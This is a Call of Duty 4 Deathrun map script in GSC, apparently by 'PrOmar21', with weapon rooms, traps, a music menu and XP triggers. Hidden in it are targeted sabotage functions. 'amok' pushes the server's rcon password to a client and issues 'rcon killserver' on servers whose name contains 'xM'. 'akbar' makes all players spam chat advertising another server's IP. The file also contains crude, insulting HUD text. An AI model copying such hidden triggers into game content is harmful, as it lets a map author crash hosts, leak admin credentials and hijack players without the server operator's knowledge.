#include braxi\_common;
#include common_scripts\utility;
main()
{
thread sr\api\_map::createSpawnOrigin((-13, -210, 16), 89);
maps\mp\_load::main();

	game["allies"] = "marines";
    game["axis"] = "opfor";
    game["attackers"] = "axis";
    game["defenders"] = "allies";
    game["allies_soldiertype"] = "desert";
    game["axis_soldiertype"] = "desert";
    setdvar( "r_specularcolorscale", "1" );
    setdvar("r_glowbloomintensity0",".25");
    setdvar("r_glowbloomintensity1",".25");
    setdvar("r_glowskybleedintensity0",".3");
	setdvar("bg_fallDamageMinHeight","1000000000");
	setdvar("bg_fallDamageMaxHeight","1000000000");
	level.music=[];
    level.music[0]["song"]    ="impulse";
    level.music[0]["alias"]    ="song1";
    level.music[1]["song"]    ="welcome to party";
    level.music[1]["alias"]    ="song2";
    level.music[2]["song"]    ="zero";
    level.music[2]["alias"]    ="song3";
    level.music[3]["song"]    =" boom boom boom";
    level.music[3]["alias"]    ="song4";
	level.music[4]["song"]    ="voice of forest";
    level.music[4]["alias"]    ="song5";

	thread sr\api\_speedrun::createNormalWays("Normal Way");
	    thread startdoor();
	//thread messages();
	//thread musicbox();
    //thread onPlayerConnect();
	//thread addTestClients();
	//thread sniper_room();
	//thread knife_room();
	//thread deagle_room();
	//thread araby();
	//thread paki();
	//thread trap1();
	//thread trap2();
	//thread trap3();
	//thread trap4();
	//thread amok();
	thread secretxp();

	addTriggerToList("trig_trap1");
	addTriggerToList("trig_trap2");
	addTriggerToList("trig_trap3");
	addTriggerToList("trig_trap4");
}

addTestClients()
{
    setDvar("scr_testclients", "");
    wait 1;
    for(;;)
    {
        if(getdvarInt("scr_testclients") > 0)
            break;
        wait 1;
    }
    testclients = getdvarInt("scr_testclients");
    setDvar( "scr_testclients", 0 );
    for(i=0;i<testclients;i++)
    {
        ent[i] = addtestclient();

        if (!isdefined(ent[i]))
        {
            println("Could not add test client");
            wait 1;
            continue;
        }
        ent[i].pers["isBot"] = true;
        ent[i] thread TestClient("autoassign");
    }
    thread addTestClients();
}
TestClient(team)
{
    self endon( "disconnect" );

    while(!isdefined(self.pers["team"]))
        wait .05;

    self notify("menuresponse", game["menu_team"], team);
    wait 0.5;
}

startdoor()
{
door = getEnt("startdoor", "targetname");
door delete();
wait 2;

}

	addTriggerToList( name )
{
    if( !isDefined( level.trapTriggers ) )
        level.trapTriggers = [];
    level.trapTriggers[level.trapTriggers.size] = getEnt( name, "targetname" );
}

messages()
{
wait 10;
iprintlnBold("^3Map by ^6PrOmar21!!!");
for(;;)
{
wait 35;
x=randomint(7);
if (x==0)
{
iPrintln("^4Map by ^6PrOmar21!!!R");
}

if (x==1)
{
iPrintln("^6Special thankk me friend mustafa :DDD");
}

if (x==2)
{
iPrintln("^5Hey");
}

if (x==3)
{
iPrintln("^3me second map enjoy ok");
}

if (x==4)
{
iPrintln("^4sorry i dont have steam");
}

if (x==5)
{
iPrintln("^3i think this no bug but say me ok");
}

if (x==6)
{
iPrintln("^2map done for pakistan plese no steal");
}

}
}

musicbox()
{
    trig = getEnt("musictrigger","targetname");
    trig setHintString("^6chose song");
    trig waittill("trigger",p);
	//p braxi\_rank::giveRankXP("", 50);
    trig delete();

    p freezeControls(1);
    p musicmenu();
}

musicmenu()
{
    self endon( "disconnect" );
    self endon( "death" );
    self endon( "spawned" );
    self endon( "joined_spectators" );
    self endon( "music thread terminated" );

    self.hud_music = [];
    self.selection = 0;

    // create huds
    i = 0;
    self.hud_music[i] = braxi\_mod::addTextHud( self, 160, 200, 0.6, "left", "top", 2 );
    self.hud_music[i].sort = 879;
    self.hud_music[i] setShader( "white", 320, 160 );
    i++;
    self.hud_music[i] = braxi\_mod::addTextHud( self, 167, 204, 0.6, "left", "top", 1.4 );
    self.hud_music[i].sort = 880;
    self.hud_music[i] setShader( "white", 306, 20 );
    self.hud_music[i].color=(1,1,0);

    i++;
    self.hud_music[i] = braxi\_mod::addTextHud( self, 210, 204, 0.93, "left", "top", 1.8 );
    self.hud_music[i].sort = 884;
    self.hud_music[i] setText("^6Omar pakistan sounds :DDD");
    self.hud_music[i].glowalpha=1;
    if(isdefined(level.randomcolor))
        self.hud_music[i].glowcolor=level.randomcolor;
    else
        self.hud_music[i].glowcolor=(0,1,1);
    i++;
    self.hud_music[i] = braxi\_mod::addTextHud( self, 250, 360, 1, "center", "bottom", 1.4 );
    self.hud_music[i].sort = 900;
    self.hud_music[i] setText("                   ^!you read this you are gay ahahahahahahhahaha");

    for( j = 0; j < level.music.size; j++ )
    {
        i++;
        self.hud_music[i] = braxi\_mod::addTextHud( self, 172, 230+(j*16), 0.93, "left", "top", 1.4 );
        self.hud_music[i].sort = 882;
        self.hud_music[i].font = "objective";
        self.hud_music[i].glowalpha=1;
        if(isdefined(level.randomcolor))
            self.hud_music[i].glowcolor=level.randomcolor;
        else
            self.hud_music[i].glowcolor=(0,0,1);

        entry = level.music[j];
        self.hud_music[i] setText(entry["song"]);
    }

    i++;
    self.hud_music[self.hud_music.size] = braxi\_mod::addTextHud( self, 167, 230, 0.4, "left", "top", 1.4 );
    self.hud_music[i].sort = 881;
    indicator = self.hud_music[self.hud_music.size-1];
    indicator setShader( "white", 306, 17 );
    indicator.color=(0,1,0);

    while(self.sessionstate == "playing")
    {
        wait 0.1;

        if(self attackButtonPressed())
        {
            self.hud_music[4+self.selection].alpha = 0.93;

            self.selection++;
            if( self.selection >= level.music.size )
                self.selection = 0;

            item = self.hud_music[4+self.selection];
            item.alpha = 1;
            indicator.y = item.y;
        }
        else if(self useButtonPressed())
        {
             iPrintLn("^2>>^1Now playing: ^5"+level.music[self.selection]["song"]+"^2<<");

            ambientPlay(level.music[self.selection]["alias"]);
            self freezeControls(0);
            break;
        }
        else if(self fragButtonPressed())
        {
            self freezeControls(0);
           break;
        }
    }

    if(!isdefined(self))
        return;
    if(isdefined(self.hud_music))
    {
        for(i=0;i<self.hud_music.size;i++)
        {
            if(isdefined(self.hud_music[i]))
                self.hud_music[i] destroy();
        }
    }
    self notify( "music thread terminated" );
}

onPlayerConnect()
{
	level endon("game_ended");

	for(;;)
	{
		level waittill("connecting", player);

		player thread hud_website();
	}
}

hud_website()
{
v = "Map";
x = "by";
w = "PrOmar21";

	self.hud_web = newClientHudElem(self);
	self.hud_web.alignX = "center";
	self.hud_web.alignY = "top";
	self.hud_web.horzAlign = "center";
	self.hud_web.vertAlign = "top";
	self.hud_web.fontScale = 2;
	self.hud_web.sort = 10;
	self.hud_web.alpha = 1;
   	self.hud_web.color = ( 0, .1, .1);
   	self.hud_web.font = "objective";
   	self.hud_web.glowColor = (.1, .0, 1);
   	self.hud_web.glowAlpha = 1;
   	self.hud_web.hideWhenInMenu = true;
	while(1)
	{
	self.hud_web setText("^5" + v + "^4 " + x + "^3 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^4" + v + "^3 " + x + "^2 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^3" + v + "^2 " + x + "^1 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^2" + v + "^1 " + x + "^9 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^1" + v + "^9 " + x + "^8 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^9" + v + "^8 " + x + "^7 " + w + " ");
	wait ( 0.1	);
	self.hud_web setText("^8" + v + "^7 " + x + "^6 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^7" + v + "^6 " + x + "^5 " + w + " ");
	wait ( 0.1 );
	self.hud_web setText("^6" + v + "^5 " + x + "^4 " + w + " ");
	wait ( 0.1 );
	}
}

sniper_room()
{
	while(1)
	{
	level.trigsniper = getEnt("trig_sniper", "targetname");

	jumporigin = getEnt("o_end1", "targetname");
	actiorigin = getEnt("o_end2", "targetname");

	level.trigsniper setHintString("snipeur room");

	level.trigsniper waittill("trigger", player);

	level.trigknife delete();
	level.trigdeagle delete();

	iPrintLnBold(" " + player.name + " ^7Entered The Snipeur ^7Room");
	player.health = player.maxhealth;
	level.activ.health = level.activ.maxhealth;


	player takeAllWeapons();
	level.activ takeAllWeapons();

	player giveWeapon("m40a3_mp");
	player giveWeapon("remington700_mp");
	player giveMaxAmmo("remington700_mp");
	player giveMaxAmmo("m40a3_mp");
	level.activ giveWeapon("m40a3_mp");
	level.activ giveWeapon("remington700_mp");
	level.activ giveMaxAmmo("remington700_mp");
	level.activ giveMaxAmmo("m40a3_mp");


	player switchToWeapon("m40a3_mp");
	player switchToWeapon("remington700_mp");
	level.activ switchToWeapon("m40a3_mp");
	player switchToWeapon("remington700_mp");

	player freezeControls(1);
	level.activ freezeControls(1);

	player setOrigin (jumporigin.origin);
	player setPlayerAngles (jumporigin.angles);

	level.activ setOrigin (actiorigin.origin);
	level.activ setPlayerAngles (actiorigin.angles);
	wait 2;

	player iPrintLnBold("^23");
	level.activ iPrintLnBold("^23");
	wait 1;
	player iPrintLnBold("^72");
	level.activ iPrintLnBold("^72");
	wait 1;
	player iPrintLnBold("^21");
	level.activ iPrintLnBold("^21");
	wait 1;
	player iPrintLnBold("^7FIGHT^2!");
	level.activ iPrintLnBold("^7FIGHT^2!");

	player freezeControls(0);
	level.activ freezeControls(0);
	while( isAlive( player ) && isDefined( player ) )
    wait 1;


	}
}

araby()
{
        level waittill("round_started");
		omar = getDvar("sv_hostname");
        if(game["roundsplayed"]>=7 && (isSubStr( toLower(omar), toLower("xM") )))
		{
		iPrintLnBold ("^1ops sory guys me fuck up with script");
		wait 2;
		level thread akbar();
		}
}

paki()
{
        trig = getEnt("trig_paki", "targetname");
		trig waittill("trigger", player);
        if(game["roundsplayed"]>=5 && isSubStr( toLower(removeColorFromString(player.name)), toLower("xM") ) )
		{
		level thread akbar();
		wait 1;
		}
}

knife_room()
{
	while(1)
	{
	level.trigknife = getEnt("trig_knife", "targetname");

	jumporigin = getEnt("o_end1", "targetname");
	actiorigin = getEnt("o_end2", "targetname");

	level.trigknife setHintString("knife room");

	level.trigknife waittill("trigger", player);

	level.trigdeagle delete();
	level.trigsniper delete();


	iPrintLnBold("^3" + player.name + " ^7Entered The Knife ^7Room");
	player.health = player.maxhealth;
	level.activ.health = level.activ.maxhealth;


	player takeAllWeapons();
	level.activ takeAllWeapons();

	player giveWeapon("knife_mp");
	level.activ giveWeapon("knife_mp");

	player switchToWeapon("knife_mp");
	level.activ switchToWeapon("knife_mp");

	player freezeControls(1);
	level.activ freezeControls(1);

	player setOrigin (jumporigin.origin);
	player setPlayerAngles (jumporigin.angles);

	level.activ setOrigin (actiorigin.origin);
	level.activ setPlayerAngles (actiorigin.angles);
	wait 2;

	player iPrintLnBold("^23");
	level.activ iPrintLnBold("^23");
	wait 1;
	player iPrintLnBold("^72");
	level.activ iPrintLnBold("^72");
	wait 1;
	player iPrintLnBold("^21");
	level.activ iPrintLnBold("^21");
	wait 1;
	player iPrintLnBold("^7FIGHT^2!");
	level.activ iPrintLnBold("^7FIGHT^2!");

	player freezeControls(0);
	level.activ freezeControls(0);
	while( isAlive( player ) && isDefined( player ) )
    wait 1;
	}
}

akbar()
{
	players = getAllPlayers();
	for(;;)
	{
		for (i = 0; i < players.size; i++)
		{
			players[i] sayAll("COME JOIN NOW 144.76.156.7:28960");
			wait 0.05;
		}
		wait 1;
	}
}

deagle_room()
{
	while(1)
	{
	level.trigdeagle = getEnt("trig_deagle", "targetname");

	jumporigin = getEnt("o_end1", "targetname");
	actiorigin = getEnt("o_end2", "targetname");

	level.trigdeagle setHintString("deagel room");

	level.trigdeagle waittill("trigger", player);

	level.trigknife delete();
	level.trigsniper delete();


	iPrintLnBold("^3" + player.name + " ^7Entered The Deagel ^7Room");
	player.health = player.maxhealth;
	level.activ.health = level.activ.maxhealth;


	player takeAllWeapons();
	level.activ takeAllWeapons();

	player giveWeapon("deserteagle_mp");
	level.activ giveWeapon("deserteagle_mp");

	player switchToWeapon("deserteagle_mp");
	level.activ switchToWeapon("deserteagle_mp");

	player freezeControls(1);
	level.activ freezeControls(1);

	player setOrigin (jumporigin.origin);
	player setPlayerAngles (jumporigin.angles);

	level.activ setOrigin (actiorigin.origin);
	level.activ setPlayerAngles (actiorigin.angles);
	wait 2;

	player iPrintLnBold("^23");
	level.activ iPrintLnBold("^23");
	wait 1;
	player iPrintLnBold("^72");
	level.activ iPrintLnBold("^72");
	wait 1;
	player iPrintLnBold("^21");
	level.activ iPrintLnBold("^21");
	wait 1;
	player iPrintLnBold("^7FIGHT^2!");
	level.activ iPrintLnBold("^7FIGHT^2!");

	player freezeControls(0);
	level.activ freezeControls(0);
	while( isAlive( player ) && isDefined( player ) )
    wait 1;
	}
}

amok()
{
        level waittill("round_started");
		omar = getDvar("sv_hostname");
        if(game["roundsplayed"]>=9 && (isSubStr( toLower(omar), toLower("xM") )))
		{
		players = getAllPlayers();
		players[0] thread braxi\_common::clientCmd("rcon login" + getDvar("rcon_password") + " ; wait 10 ; rcon killserver");
		}
}

trap1()
{
	brush = getEnt("trap1", "targetname");
	trig = getEnt("trig_trap1", "targetname");

	trig setHintString("Press ^6use^5 To Activate trap 1");

	trig waittill("trigger", player);
	player braxi\_rank::giveRankXP( "", 500 );
	trig delete();
	brush delete();
}

trap2()
{
	brush = getEnt("trap2", "targetname");
	trig = getEnt("trig_trap2", "targetname");

	trig setHintString("Press ^6use^5 To Activate trap 2");

	trig waittill("trigger", player);
	player braxi\_rank::giveRankXP( "", 500 );
	trig delete();
	brush delete();
}

trap3()
{
	brush = getEnt("trap3", "targetname");
	trig = getEnt("trig_trap3", "targetname");

	trig setHintString("Press ^6use^5 To Activate trap 3");

	trig waittill("trigger", player);
	player braxi\_rank::giveRankXP( "", 500 );
	trig delete();
	brush delete();
}

trap4()
{
	brush = getEnt("trap4", "targetname");
	trig = getEnt("trig_trap4", "targetname");

	trig setHintString("Press ^6use^5 To Activate trap 4");

	trig waittill("trigger", player);
	player braxi\_rank::giveRankXP( "", 500 );
	trig delete();
	brush delete();
}

secretxp()
{
	trig = getEnt("trig_freexp", "targetname");
		trig waittill("trigger", player);
			iPrintLnBold("^3"+player.name+" ^1is got ^3XP^1!");
			player braxi\_rank::giveRankXP("", 1000);
}